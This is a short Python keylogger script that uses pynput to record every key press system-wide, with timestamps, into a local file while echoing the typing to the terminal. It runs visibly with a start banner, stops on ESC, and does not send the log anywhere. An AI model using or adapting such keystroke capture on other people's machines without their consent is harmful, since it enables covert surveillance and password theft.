from pynput import keyboard
from datetime import datetime
import sys

log_file = "key_log.txt"
typed_text = []  # to manage terminal text

def on_press(key):
    global typed_text

    # Get readable key name
    try:
        key_name = key.char
    except AttributeError:
        key_name = key

    # Timestamp
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ---------- LOG TO FILE ----------
    with open(log_file, "a") as f:
        f.write(f"{time} - {key_name}\n")

    # ---------- TERMINAL ECHO (VISIBLE TYPING) ----------
    if hasattr(key, 'char') and key.char is not None:
        # Normal characters (a–z, 0–9, symbols)
        typed_text.append(key.char)
        sys.stdout.write(key.char)
        sys.stdout.flush()

    elif key == keyboard.Key.space:
        typed_text.append(" ")
        sys.stdout.write(" ")
        sys.stdout.flush()

    elif key == keyboard.Key.enter:
        typed_text.append("\n")
        sys.stdout.write("\n")
        sys.stdout.flush()

    elif key == keyboard.Key.backspace:
        if typed_text:
            typed_text.pop()
            # Remove last character visually
            sys.stdout.write('\b \b')
            sys.stdout.flush()

def on_release(key):
    if key == keyboard.Key.esc:
        print("\nLogging stopped.")
        return False

print("🔵 Keystroke Monitoring Started (Visible Typing Mode)")
print("Press ESC to stop.\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
